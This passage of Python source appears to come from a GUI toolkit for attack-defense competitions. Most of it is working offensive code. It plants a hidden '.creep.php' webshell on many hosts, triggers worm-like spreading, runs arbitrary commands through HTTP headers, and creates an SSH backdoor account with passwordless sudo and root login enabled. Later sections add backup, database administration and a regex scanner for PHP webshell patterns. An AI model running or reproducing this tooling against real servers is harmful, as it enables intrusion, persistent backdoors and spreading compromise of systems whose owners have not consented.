                stdin, stdout, stderr = ssh.exec_command(cmd2)
                if stdout.channel.recv_exit_status() != 0:
                    return (ip, False, f"写入.dat失败: {(stderr.read().decode(errors='ignore') or '')[:50]}")
                ssh.close()
                try:
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php', timeout=min(c['timeout'], 8))
                    htip = f'HTTP:{r.status_code}'
                except Exception as e:
                    htip = f'HTTP验证失败(不影响):{str(e)[:30]}'
                return (host, True, f'SSH部署成功 | {htip}')
            err = None
            for base in self._bases_for(ip, c):
                try:
                    s = _session()
                    for fname, b64data in [('.creep.php', b64_php), ('.creep.dat', b64_dat)]:
                        wpath = f'/{web_root}/{fname}'
                        cmd = f"system('echo {b64data} | base64 -d > {wpath}');"
                        self._shell_req(s, base, c, cmd)
                        time.sleep(0.05)
                    time.sleep(0.3)
                    r = s.get(f'{base}/.creep.php', timeout=c['timeout'])
                    tag = ' (https降级)' if base.startswith('https') and (not c.get('https')) else ''
                    return (ip, r.status_code in (200, 403), f'部署成功{tag}' if r.status_code in (200, 403) else f'状态{r.status_code}')
                except Exception as e:
                    err = e
            return (ip, False, str(err)[:50])
        except Exception as e:
            return (ip, False, str(e)[:50])

    def do_deploy(self):
        ips = self.get_targets()
        if not ips:
            return
        self.set_btns(False)
        self.save_cfg()
        self.log_self(f'>>> 部署 Creep 到 {len(ips)} 台', 'info')
        c = self.cfg_vals()

        def run():
            ok = fail = 0
            with ThreadPoolExecutor(max_workers=min(10, len(ips))) as ex:
                fs = {ex.submit(self.deploy_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f"  {('[OK]' if succ else '[FAIL]')} {ip}: {msg}", 'ok' if succ else 'fail')
                    ok += succ
                    fail += not succ
            self.log_self(f'结果: {ok}成功 {fail}失败', 'ok' if ok >= fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def spread_one(self, ip, c):
        host, web_port = self._hp(ip, c)
        base = make_base(host, web_port, c['https'])
        try:
            r = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Spread': '1'}, timeout=c['timeout'])
            return (ip, 'OK' in r.text[:10], r.text.strip()[:30])
        except Exception as e:
            return (ip, False, str(e)[:40])

    def do_spread(self):
        ips = self.get_targets()
        if not ips:
            return
        self.set_btns(False)
        self.save_cfg()
        self.log_self(f'>>> 触发扩散 到 {len(ips)} 台', 'info')
        c = self.cfg_vals()

        def run():
            ok = fail = 0
            with ThreadPoolExecutor(max_workers=min(10, len(ips))) as ex:
                fs = {ex.submit(self.spread_one, ip, c): ip for ip in ips}
                for f in as_completed(fs):
                    ip, succ, msg = f.result()
                    self.log_self(f"  {('[OK]' if succ else '[FAIL]')} {ip}: {msg}", 'ok' if succ else 'fail')
                    ok += succ
                    fail += not succ
            self.log_self(f'扩散完成: {ok}成功 {fail}失败', 'ok' if ok >= fail else 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        async_run(run)

    def do_check(self):
        ips = self.get_targets()
        if not ips:
            return
        self.log_self(f'>>> 检查扩散范围 ({len(ips)}台)', 'info')
        c = self.cfg_vals()

        def run():
            for ip in ips:
                try:
                    host, web_port = self._hp(ip, c)
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Cmd': 'find / -name ".creep.php" -type f 2>/dev/null'}, timeout=c['timeout'])
                    cnt = len(r.text.strip().split('\n')) if r.text.strip() and r.text.strip() != '(empty)' else 0
                    samples = r.text.strip()[:120] if cnt else '无'
                    self.log_self(f'  [{ip}] 感染目录: {cnt}', 'ok' if cnt else 'fail')
                    if cnt:
                        self.log_self(f'    路径: {samples}', 'info')
                except Exception as e:
                    self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
            self.root.after(0, lambda: self.set_btns(True))
        self.set_btns(False)
        async_run(run)

    def do_exec(self):
        cmd = self.e_cmd.get().strip()
        if not cmd:
            messagebox.showwarning('提示', '请输入命令')
            return
        ips = self.get_targets()
        if not ips:
            return
        self.log_self(f'>>> 执行: {cmd}', 'info')
        c = self.cfg_vals()

        def run():
            for ip in ips:
                try:
                    host, web_port = self._hp(ip, c)
                    base = make_base(host, web_port, c['https'])
                    r = requests.get(f'{base}/.creep.php', headers={'X-Creep': c['password'], 'X-Cmd': cmd}, timeout=c['timeout'])
                    self.log_self(f'[{ip}] {r.text.strip()[:300]}', 'out')
                except Exception as e:
                    self.log_self(f'[FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_kill(self):
        ips = self.get_targets()
        if not ips:
            return
        if not messagebox.askyesno('确认', f'清除 {len(ips)} 台靶机上的 Creep webshell？'):
            return
        self.log_self(f'>>> 清除 Creep ({len(ips)}台)', 'warn')
        c = self.cfg_vals()

        def run():
            web_root = c.get('web_root', '/var/www/html')
            for ip in ips:
                try:
                    host, web_port = self._hp(ip, c)
                    base = make_base(host, web_port, c['https'])
                    s = _session()
                    s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: f'@unlink("{web_root}/.creep.php");@unlink("{web_root}/.creep.dat");@unlink("{web_root}/.user.ini");find {web_root} /tmp -name "*creep*" -type f -delete 2>/dev/null;echo "OK";'}, timeout=c['timeout'])
                    self.log_self(f'  [OK] {ip}', 'ok')
                except Exception as e:
                    self.log_self(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def ssh_back_log_msg(self, msg, tag='info'):
        self.ssh_back_log.config(state=tk.NORMAL)
        self.ssh_back_log.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n", tag)
        self.ssh_back_log.see(tk.END)
        self.ssh_back_log.config(state=tk.DISABLED)

    def do_ssh_backdoor(self):
        ips = self.get_targets()
        if not ips:
            return
        c = self.cfg_vals()
        backuser = self.c_ssh_backuser.get().strip() or 'backdoor'
        backpass = c['password']
        self.ssh_back_log_msg(f'>>> 植入SSH后门 到 {len(ips)} 台', 'info')

        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    s = _session()
                    cmds = [f'useradd -m -s /bin/bash {backuser} 2>/dev/null; echo "{backuser}:{backpass}" | chpasswd 2>/dev/null', f'usermod -aG sudo {backuser} 2>/dev/null || usermod -aG wheel {backuser} 2>/dev/null', f'echo "{backuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null', f'mkdir -p ~{backuser}/.ssh && chmod 700 ~{backuser}/.ssh && touch ~{backuser}/.ssh/authorized_keys', 'sed -i "s/PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config', 'service sshd restart 2>/dev/null || systemctl restart sshd 2>/dev/null']
                    for cmd in cmds:
                        s.post(f"{base}{c['shell_url']}", data={c['shell_pass']: cmd}, timeout=c['timeout'])
                        time.sleep(0.1)
                    self.ssh_back_log_msg(f'  [OK] {ip} 后门账号: {backuser}', 'ok')
                except Exception as e:
                    self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def do_ssh_back_check(self):
        ips = self.get_targets()
        if not ips:
            return
        c = self.cfg_vals()
        backuser = self.c_ssh_backuser.get().strip() or 'backdoor'
        self.ssh_back_log_msg(f'>>> 检查SSH后门 账号: {backuser}', 'info')

        def run():
            for ip in ips:
                try:
                    base = make_base(ip, c['port'], c['https'])
                    r = _session().post(f"{base}{c['shell_url']}", data={c['shell_pass']: f'id {backuser} 2>/dev/null || echo "NOT_FOUND"'}, timeout=c['timeout'])
                    if 'NOT_FOUND' in r.text:
                        self.ssh_back_log_msg(f'  [!] {ip}: 后门账号不存在', 'fail')
                    else:
                        self.ssh_back_log_msg(f'  [OK] {ip}: {r.text.strip()[:80]}', 'ok')
                except Exception as e:
                    self.ssh_back_log_msg(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def c_hb_msg(self, msg, tag='info'):
        self.c_hb_text.config(state=tk.NORMAL)
        self.c_hb_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n", tag)
        self.c_hb_text.see(tk.END)
        self.c_hb_text.config(state=tk.DISABLED)

    def _heartbeat_after(self, stopper, delay, function, *args):
        self.root.after(delay, lambda: function(*args) if not stopper.is_set() else None)

    def toggle_creep_hb(self):
        if self.c_hb_running:
            self.c_hb_running = False
            self._creep_hb_stop.set()
            self.btn_c_hb.config(text='▶ 开始心跳')
            self.c_hb_lbl.config(text='⏸ 已停止', foreground='#6b7f9e')
            return
        ips = self.get_targets()
        if not ips:
            return
        try:
            interval = int(self.c_hb_int.get().strip() or 30)
            if not 5 <= interval <= 86400:
                raise ValueError('心跳间隔应为 5～86400 秒')
            c = self.cfg_vals()
        except (ValueError, TypeError) as exc:
            messagebox.showerror('输入错误', str(exc))
            return
        self._creep_hb_stop = stopper = threading.Event()
        self.c_hb_running = True
        self.btn_c_hb.config(text='⏹ 停止心跳')
        self.c_hb_lbl.config(text=f'⏳ 检测中', foreground='#00ff9d')

        def run():
            while not stopper.is_set():
                alive = dead = 0
                with ThreadPoolExecutor(max_workers=min(20, len(ips))) as ex:

                    def check(ip):
                        try:
                            base = make_base(ip, c['port'], c['https'])
                            r = requests.get(f'{base}/.creep.php', timeout=c['timeout'])
                            return (ip, r.status_code in (200, 403))
                        except Exception:
                            return (ip, False)
                    fs = {ex.submit(check, ip): ip for ip in ips}
                    for f in as_completed(fs):
                        ip, ok = f.result()
                        if ok:
                            alive += 1
                        else:
                            dead += 1
                self.c_hb_msg(f'存活: {alive}/{len(ips)} 死亡: {dead}', 'alive' if alive > dead else 'dead')
                self._heartbeat_after(stopper, 0, lambda a=alive, d=dead: self.c_hb_lbl.config(text=f'🟢 {a}  🔴 {d}', foreground='#00ff9d' if a > d else '#ff4d6d'))
                for _ in range(interval):
                    if stopper.is_set():
                        break
                    time.sleep(1)
            self.c_hb_msg('心跳监控已停止', 'info')
        _GodHandThread(target=run, daemon=True).start()

    def _domain_init(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.cfg_file = os.path.join(CONFIG_DIR, 'creep_config.json')
        d = {'ip': '', 'port': '80', 'https': False, 'shell_url': '/shell.php', 'shell_pass': 'cmd', 'password': 'cmd', 'web_root': '/var/www/html'}
        try:
            if os.path.exists(self.cfg_file):
                with open(self.cfg_file) as f:
                    d.update(json.load(f))
        except Exception:
            pass
        self.cfg = d
    _fields = {'running': {'kind': 'literal', 'default': False}, 'creep_conn_mode': {'kind': 'value', 'default': 'webshell'}, 'e_ip': {'kind': 'value', 'default': ''}, 'e_port': {'kind': 'value', 'default': ''}, 'v_https': {'kind': 'value', 'default': False}, 'e_surl': {'kind': 'value', 'default': ''}, 'e_spass': {'kind': 'value', 'default': ''}, 'e_cpass': {'kind': 'value', 'default': ''}, 'e_to': {'kind': 'value', 'default': '10'}, 'e_webroot': {'kind': 'value', 'default': ''}, 'e_creep_ssh_host': {'kind': 'value', 'default': ''}, 'e_creep_ssh_port': {'kind': 'value', 'default': '22'}, 'e_creep_ssh_user': {'kind': 'value', 'default': 'root'}, 'e_creep_ssh_pass': {'kind': 'value', 'default': ''}, 'e_creep_ssh_webdir': {'kind': 'value', 'default': '/var/www/html'}, 'e_cmd': {'kind': 'value', 'default': ''}, 'worm_type': {'kind': 'value', 'default': 'creep'}, 'worm_key': {'kind': 'value', 'default': 'ylphantom'}, 'shell_func': {'kind': 'value', 'default': 'eval'}, 'shell_method': {'kind': 'value', 'default': 'post'}, 'log_w': {'kind': 'log'}, 'c_ssh_port': {'kind': 'value', 'default': '22'}, 'c_ssh_user': {'kind': 'value', 'default': 'root'}, 'c_ssh_pass': {'kind': 'value', 'default': ''}, 'c_ssh_backuser': {'kind': 'value', 'default': 'backdoor'}, 'ssh_back_log': {'kind': 'log'}, 'c_hb_running': {'kind': 'literal', 'default': False}, 'c_hb_int': {'kind': 'value', 'default': '30'}, 'c_hb_text': {'kind': 'text', 'default': ''}, '_creep_hb_stop': {'kind': 'event'}, 'parent': {'kind': 'value', 'default': ''}, 'log': {'kind': 'value', 'default': ''}, 'cfg_file': {'kind': 'value', 'default': ''}, 'cfg': {'kind': 'value', 'default': ''}, 'ws_frame': {'kind': 'value', 'default': ''}, 'ssh_frame': {'kind': 'value', 'default': ''}, 'btn_implant': {'kind': 'value', 'default': ''}, 'btn_dep': {'kind': 'value', 'default': ''}, 'btn_spread': {'kind': 'value', 'default': ''}, 'btn_check': {'kind': 'value', 'default': ''}, 'btn_kill': {'kind': 'value', 'default': ''}, 'btn_exec': {'kind': 'value', 'default': ''}, 'btn_ssh_back': {'kind': 'value', 'default': ''}, 'btn_ssh_check': {'kind': 'value', 'default': ''}, 'btn_c_hb': {'kind': 'value', 'default': ''}, 'c_hb_lbl': {'kind': 'value', 'default': ''}, 'root': {'kind': 'value', 'default': ''}}

class OpsTab(ActorState):

    def _exec_cmd(self, ip, cmd, port=80, https=False, timeout=10):
        """蠕虫通道优先, webshell回退, 自动多端口探测"""
        ports = []
        try:
            ep = safe_int(self.af_port.get(), 0) if hasattr(self, 'af_port') else 0
            if ep:
                ports.append(ep)
        except Exception:
            pass
        ports += [8804, 8080, 80, 8802, 8088, 8888]
        seen = set()
        ports = [p for p in ports if p and (not (p in seen or seen.add(p)))]
        shell_url = '/shell.php'
        shell_pass = 'cmd'
        try:
            if hasattr(self, 'af_shell'):
                shell_url = self.af_shell.get().strip() or '/shell.php'
            if hasattr(self, 'af_pass'):
                shell_pass = self.af_pass.get().strip() or 'cmd'
        except Exception:
            pass
        for p in ports:
            base = make_base(ip, p, https)
            s = _session()
            try:
                r = s.get(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=min(timeout, 8))
                if r.status_code == 200 and r.text.strip():
                    return r.text
            except Exception:
                pass
            try:
                r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=min(timeout, 8))
                if r.status_code == 200 and r.text.strip():
                    return r.text
            except Exception:
                pass
        return ''

    def _bak_dir(self):
        d = os.path.join(EXE_DIR, '防御模块', 'backup')
        try:
            os.makedirs(d, exist_ok=True)
        except Exception:
            pass
        return d

    def _open_bak_dir(self):
        d = self._bak_dir()
        try:
            os.startfile(d)
        except Exception as e:
            messagebox.showerror('错误', f'无法打开备份目录: {e}')

    def _switch_bak_mode(self):
        mode = self.bak_mode.get()
        self.bak_local.pack_forget()
        self.bak_ssh.pack_forget()
        if mode == 'local':
            self.bak_local.pack(fill=tk.X)
        elif mode == 'ssh':
            self.bak_ssh.pack(fill=tk.X)

    def do_backup(self):
        lw = self.bak_lw
        lw.clear()
        mode = self.bak_mode.get()
        if mode == 'local':
            wd = self.bak_webdir.get().strip()
            if not os.path.isdir(wd):
                messagebox.showerror('错误', f'目录不存在: {wd}')
                return
            lw.log(f'>>> 本地备份 {wd}', 'info')

            def _local():
                import tarfile
                bak_dir = self._bak_dir()
                bak_path = os.path.join(bak_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz")
                with tarfile.open(bak_path, 'w:gz') as tar:
                    tar.add(wd, arcname=os.path.basename(wd))
                lw.log(f'[OK] 本地备份完成 ({os.path.getsize(bak_path) / 1024:.1f}KB)', 'ok')
            async_run(_local)
        elif mode == 'ssh':
            host = self.bak_ssh_host.get().strip()
            port = self.bak_ssh_port.get().strip()
            user = self.bak_ssh_user.get().strip()
            pwd = self.bak_ssh_pass.get().strip()
            rdir = self.bak_ssh_dir.get().strip()
            if not host or not pwd:
                messagebox.showerror('错误', '请填写SSH信息')
                return
            lw.log(f'>>> SSH远程备份 {host}:{rdir}', 'info')

            def _ssh():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    import ntpath
                    parent_dir = ntpath.dirname(rdir.rstrip('/')) or '/var/www'
                    dir_name = ntpath.basename(rdir.rstrip('/')) or 'html'
                    stdin, stdout, stderr = ssh.exec_command(f'tar czf - -C {parent_dir} {dir_name} 2>/dev/null')
                    data = stdout.read()
                    bak_dir = self._bak_dir()
                    bak_path = os.path.join(bak_dir, f"ssh_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz")
                    with open(bak_path, 'wb') as f:
                        f.write(data)
                    lw.log(f'[OK] SSH备份完成 ({os.path.getsize(bak_path) / 1024:.1f}KB)', 'ok')
                    ssh.close()
                except Exception as e:
                    lw.log(f'[FAIL] SSH备份失败: {e}', 'fail')
            async_run(_ssh)

    def do_restore(self):
        lw = self.bak_lw
        lw.clear()
        mode = self.bak_mode.get() if hasattr(self, 'bak_mode') else 'local'
        bd = self._bak_dir() if hasattr(self, '_bak_dir') else self.bak_dir.get().strip()
        if not os.path.isdir(bd):
            messagebox.showerror('错误', f'备份目录不存在：{bd}')
            return
        backup = _restore_backup_choice(bd)
        if not backup:
            lw.log('已取消还原，未修改文件', 'info')
            return
        if mode == 'local':
            destination = self.bak_webdir.get().strip()
            if not os.path.isdir(destination):
                messagebox.showerror('错误', '请选择已存在的还原目录')
                return
            if not messagebox.askyesno('确认还原', f'备份：{backup}\n目标：{os.path.abspath(destination)}\n\n同名文件将被覆盖。确认继续？', default='no'):
                lw.log('已取消还原，未修改文件', 'info')
                return

            def run():
                try:
                    count = restore_local_archive(backup, destination)
                    lw.log(f'[OK] 还原完成：{count} 个文件', 'ok')
                except Exception as exc:
                    lw.log(f'[FAIL] 还原失败：{exc}', 'fail')
            async_run(run)
            return
        host = self.bak_ssh_host.get().strip()
        port = self.bak_ssh_port.get().strip() or '22'
        user = self.bak_ssh_user.get().strip()
        password = self.bak_ssh_pass.get()
        destination = self.bak_ssh_dir.get().strip()
        try:
            port = int(port)
            if not 1 <= port <= 65535 or not host or (not destination.startswith('/')) or (destination == '/'):
                raise ValueError('请填写有效的 SSH 主机、端口和非根目录的绝对还原路径')
        except ValueError as exc:
            messagebox.showerror('错误', str(exc))
            return
        if not messagebox.askyesno('确认远程还原', f'备份：{backup}\n目标：{host}:{destination}\n\n远程同名文件将被覆盖。确认继续？', default='no'):
            lw.log('已取消还原，未连接远程主机', 'info')
            return

        def run_remote():
            ssh = sftp = None
            remote = None
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.RejectPolicy())
                ssh.connect(host, port=port, username=user, password=password, timeout=15)
                sftp = ssh.open_sftp()
                remote = '/tmp/yl_restore_' + next(tempfile._get_candidate_names()) + '.tar.gz'
                sftp.put(backup, remote)
                sftp.close()
                sftp = None
                _, stdout, stderr = ssh.exec_command(f'tar xzf {shlex.quote(remote)} -C {shlex.quote(destination)} --strip-components=1', timeout=60)
                output = stdout.read().decode('utf-8', errors='replace')
                error = stderr.read().decode('utf-8', errors='replace')
                status = stdout.channel.recv_exit_status()
                if status != 0:
                    raise RuntimeError(f'远程解压失败，退出码 {status}：{error[:300]}')
                lw.log(f'[OK] 远程还原完成 {output[:200]}', 'ok')
            except Exception as exc:
                lw.log(f'[FAIL] 远程还原失败：{exc}', 'fail')
            finally:
                if sftp is not None:
                    sftp.close()
                if ssh is not None:
                    if remote is not None:
                        try:
                            _, cleanup_out, _ = ssh.exec_command('rm -f -- ' + shlex.quote(remote), timeout=10)
                            cleanup_out.channel.recv_exit_status()
                        except Exception:
                            pass
                    ssh.close()
        async_run(run_remote)

    def _ssh_connect(self, ip, port, user, passwd, cmd, timeout=10):
        try:
            import paramiko
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(ip, int(port), user, passwd, timeout=timeout, allow_agent=False, look_for_keys=False)
            _, stdout, stderr = c.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode('utf-8', errors='replace')
            err = stderr.read().decode('utf-8', errors='replace')
            c.close()
            return out + err
        except ImportError:
            return '[ERROR] paramiko 未安装 (pip install paramiko)'
        except Exception as e:
            return f'[ERROR] {e}'

    def do_scan(self):
        d = self.scan_dir.get().strip()
        if not os.path.isdir(d):
            messagebox.showerror('错误', f'目录不存在: {d}')
            return
        lw = self.scan_lw
        lw.clear()
        lw.log(f'>>> 扫描木马: {d}', 'info')
        delete = self.scan_del.get()
        PATTERNS = [('eval\\s*\\(\\s*\\$_', 'eval($_ 一句话木马'), ('assert\\s*\\(\\s*\\$_', 'assert($_ 一句话木马'), ('base64_decode\\s*\\(\\s*\\$_', 'base64解码后门'), ('preg_replace\\s*\\(\\s*/[^/]*e\\s*', 'preg_replace /e 代码执行'), ('array_map\\s*\\(\\s*[\\\'"]assert[\\\'"]\\s*,', 'array_map assert'), ('call_user_func\\s*\\(\\s*[\\\'"]assert[\\\'"]\\s*,', 'call_user_func assert'), ('`\\s*\\$_', '反引号执行($_`)'), ('create_function\\s*\\(\\s*[\\\'"]', 'create_function后门'), ('popen\\s*\\(\\s*\\$_', 'popen后门'), ('proc_open\\s*\\(\\s*\\$_', 'proc_open后门'), ('move_uploaded_file\\s*\\(\\s*\\$_', '上传后门'), ('gzinflate\\s*\\(\\s*base64_decode', 'gz压缩后门')]

        def scan():
            total = sus = 0
            for root, dirs, files in os.walk(d):
                dirs[:] = [x for x in dirs if not x.startswith('.') and x not in ('node_modules', 'vendor', 'cache', 'runtime')]
                for fname in files:
                    ext = os.path.splitext(fname)[1].lower()
                    if ext not in ('.php', '.php5', '.phtml', '.php7', '.pht', '.asp', '.aspx', '.jsp'):
                        continue
                    fpath = os.path.join(root, fname)
                    total += 1
                    try:
                        sz = os.path.getsize(fpath)
                        if sz > 10485760:
                            continue
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as fh:
                            content = fh.read(262144)
                        findings = []
                        for pat, desc in PATTERNS:
                            if re.search(pat, content, re.I):
                                findings.append(desc)
                        if findings:
                            sus += 1
                            lw.log(f'  [!] {fpath}', 'warn')
                            for desc in findings:
                                lw.log(f'      → {desc}', 'fail')
                            if delete:
                                try:
                                    os.remove(fpath)
                                    lw.log(f'      已删除', 'ok')
                                except Exception as ex:
                                    lw.log(f'      删除失败: {ex}', 'fail')
                    except Exception:
                        pass
            lw.log(f'扫描完成: {total} 文件, {sus} 可疑', 'ok' if sus == 0 else 'warn')
        async_run(scan)

    def _db_cmd(self, cmd, timeout=10):
        import base64 as _b64
        db_user = self.db_user.get().strip()
        db_pass = self.db_pass.get().strip()
        b64 = _b64.b64encode(cmd.encode('utf-8')).decode('ascii')
        return self._ssh_connect(self.db_ip.get().strip(), self.db_ssh_port.get(), self.db_ssh_user.get(), self.db_ssh_pass.get(), f"echo {b64} | base64 -d | mysql -u{db_user} -p'{db_pass}' 2>&1", timeout=timeout)

    def do_db_show(self):
        self.db_lw.log('>>> 查询数据库列表', 'info')
        r = self._db_cmd('SHOW DATABASES')
        self.db_lw.log(r[:1000], 'out')

    def do_db_create(self):
        name = self.db_name.get().strip()
        if not name:
            messagebox.showwarning('提示', '请填写数据库名')
            return
        if not re.match('^[A-Za-z0-9_\\-\\.]+$', name):
            messagebox.showwarning('提示', '数据库名含非法字符')
            return
        self.db_lw.log(f'>>> 建库: {name}', 'info')
        r = self._db_cmd(f'CREATE DATABASE IF NOT EXISTS `{name}` DEFAULT CHARACTER SET utf8mb4')
        self.db_lw.log(r[:500] or '[OK] 建库成功', 'ok' if not r.strip() else 'fail')

    def do_db_tables(self):
        name = self.db_name.get().strip()
        if not name:
            messagebox.showwarning('提示', '请填写数据库名')
            return
        self.db_lw.log(f'>>> 表列表: {name}', 'info')
        r = self._db_cmd(f'SHOW TABLES FROM `{name}`')
        self.db_lw.log(r[:1500], 'out')

    def do_db_data(self):
        name = self.db_name.get().strip()
        table = self.db_table.get().strip()
        if not name or not table:
            messagebox.showwarning('提示', '请填写数据库名和表名')
            return
        self.db_lw.log(f'>>> 查询数据: {name}.{table} LIMIT 50', 'info')

        def run():
            r = self._db_cmd(f'SELECT * FROM `{name}`.`{table}` LIMIT 50', timeout=20)
            self.db_lw.log(r[:4000] or '[无数据]', 'out')
        async_run(run)

    def do_db_sql(self):
        q = self.db_sql.get().strip()
        if not q:
            messagebox.showwarning('提示', '请输入SQL语句')
            return
        self.db_lw.log(f'>>> 执行SQL: {q[:120]}', 'info')
        qs = q.rstrip(';')
        if re.match('^(INSERT|UPDATE|DELETE|DROP|TRUNCATE|ALTER|RENAME)\\b', qs, re.I):
            if not messagebox.askyesno('写操作确认', f'该SQL为写操作：\n{qs}\n\n确认执行？'):
                return

        def run():
            r = self._db_cmd(qs, timeout=20)
            self.db_lw.log(r[:4000] or '[OK] 执行完成', 'ok' if not r.strip() else 'out')
        async_run(run)

    def do_db_dump(self):
        ip = self.db_ip.get().strip()
        self.db_lw.log(f'>>> 备份数据库 {ip}', 'info')

        def run():
            fname = f"db_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.gz"
            cmd = f'mysqldump -u{self.db_user.get().strip()} -p{self.db_pass.get().strip()} --all-databases 2>/dev/null | gzip -c | base64 -w0'
            r = self._ssh_connect(ip, self.db_ssh_port.get(), self.db_ssh_user.get(), self.db_ssh_pass.get(), cmd, timeout=30)
            if r.startswith('[ERROR]'):
                self.db_lw.log(f'[FAIL] {r}', 'fail')
            else:
                out = os.path.join(CONFIG_DIR, fname)
                with open(out, 'wb') as fh:
                    try:
                        fh.write(base64.b64decode(r))
                    except Exception:
                        fh.write(r.encode())
                sz = os.path.getsize(out)
                self.db_lw.log(f'[OK] 备份保存: {os.path.join(CONFIG_DIR, fname)} ({sz / 1024:.1f}KB)', 'ok')
        async_run(run)

    def do_db_chpass(self):
        np = self.db_newpass.get().strip()
        if not np:
            messagebox.showwarning('提示', '请输入新密码')
            return
        self.db_lw.log('>>> 修改MySQL密码', 'info')
        r = self._db_cmd(f"ALTER USER '{self.db_user.get().strip()}'@'localhost' IDENTIFIED BY '{np}'; FLUSH PRIVILEGES;")
        self.db_lw.log(r[:300], 'ok' if not r.strip() or 'OK' in r else 'fail')

    def do_harden(self, e_ip, ep, vh, et, cmd, name='', destructive=False):
        if not cmd:
            return
        ips = parse_targets(e_ip.get().strip())
        if not ips:
            return
        if destructive:
            if not messagebox.askyesno('破坏性操作确认', f'【{name}】\n\n该加固操作可能影响靶机可用性：\n· Web目录只读 → 之后无法写入webshell/文件\n· 删除多余用户 → 误删无法恢复\n· 停止无用服务 → 相关服务不可用\n\n确认对 {len(ips)} 台靶机执行？'):
                return
        port = int(ep.get() or 80)
        timeout = int(et.get() or 10)
        lw = self.harden_lw
        lw.log(f'>>> 执行加固命令: {cmd[:60]}...', 'info')

        def run():
            for ip in ips[:5]:
                try:
                    base = make_base(ip, port, vh.get())
                    r = requests.post(f'{base}/.creep.php', headers={'X-Creep': self.entry_creep_pass.get().strip() or 'cmd', 'X-Cmd': cmd}, timeout=timeout)
                    lw.log(f'  [{ip}] {r.text[:100]}', 'ok' if r.status_code == 200 else 'fail')
                except Exception as e:
                    lw.log(f'  [FAIL] {ip}: {e}', 'fail')
        async_run(run)

    def af_log_msg(self, msg, tag='info'):
        if hasattr(self, 'af_log'):
            self.af_log.log(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", tag)

    def af_scan_remote(self):
        ips = parse_targets(self.af_ip.get().strip())
        if not ips:
            messagebox.showwarning('', '请输入目标IP')
            return
        port = safe_int(self.af_port.get(), 80)
        timeout = safe_int(self.af_to.get(), 10)
        https = self.af_https.get()
        self._af_findings = []
        for item in self.af_tree.get_children():
            self.af_tree.delete(item)
        self.af_lbl_stat.config(text='扫描中...', foreground='#ffcc00')

        def run():
            _try_add_path(os.path.join(BASE, '防御模块'))
            from auto_fix import VulnScanner
            total = len(ips)
            for i, ip in enumerate(ips, 1):
                self.af_log_msg(f'扫描 [{i}/{total}] {ip}...', 'info')
                try:
                    s = VulnScanner()
                    file_list_cmd = "find /var/www/html /app/web /var/www /web /www -type f \\( -name '*.php' -o -name '*.py' -o -name '*.jsp' -o -name '*.js' \\) 2>/dev/null | head -100"
                    file_list = self._exec_cmd(ip, file_list_cmd, port, https, timeout)
                    files = []
                    if file_list:
                        for line in file_list.split('\n'):
                            line = line.strip()
                            if line and line.endswith(('.php', '.py', '.jsp', '.js')):
                                files.append(line)
                    self.af_log_msg(f'  发现 {len(files)} 个源码文件', 'info')
                    for fp in list(set(files))[:50]:
                        try:
                            content = self._exec_cmd(ip, f'cat {fp}', port, https, timeout)
                            if content:
                                findings = s.scan_file(fp, content)
                                s.findings.extend(findings)
                        except Exception:
                            pass
                    s.stats['scanned'] = len(set(files))
                    self._af_findings.extend(s.findings)
                except Exception as e:
                    self.af_log_msg(f'[FAIL] {ip}: {e}', 'fail')
                if hasattr(self, 'af_lbl_stat'):
                    self.root.after(0, lambda c=f'扫描中 {i}/{total}': self.af_lbl_stat.config(text=c, foreground='#ffcc00'))
            self.root.after(0, self.af_refresh_tree)
            summary = f'扫描完成: {len(self._af_findings)} 个发现'
            self.af_log_msg(summary, 'ok')
            self.root.after(0, lambda: self.af_lbl_stat.config(text=f'完成: {len(self._af_findings)} 个发现', foreground='#00ff9d'))
        async_run(run)

    def af_scan_local(self):
        path = filedialog.askdirectory(title='选择源码目录')
        if not path:
            return
        self._af_findings = []
        for item in self.af_tree.get_children():
            self.af_tree.delete(item)
        self.af_lbl_stat.config(text='扫描中...', foreground='#ffcc00')
        self.af_log_msg(f'扫描本地目录: {path}', 'info')

        def run():
            _try_add_path(os.path.join(BASE, '防御模块'))
            from auto_fix import VulnScanner
            s = VulnScanner()
            s.scan_directory(path)
            self._af_findings = s.findings
            self.root.after(0, self.af_refresh_tree)
            self.af_log_msg(s.summary(), 'ok')
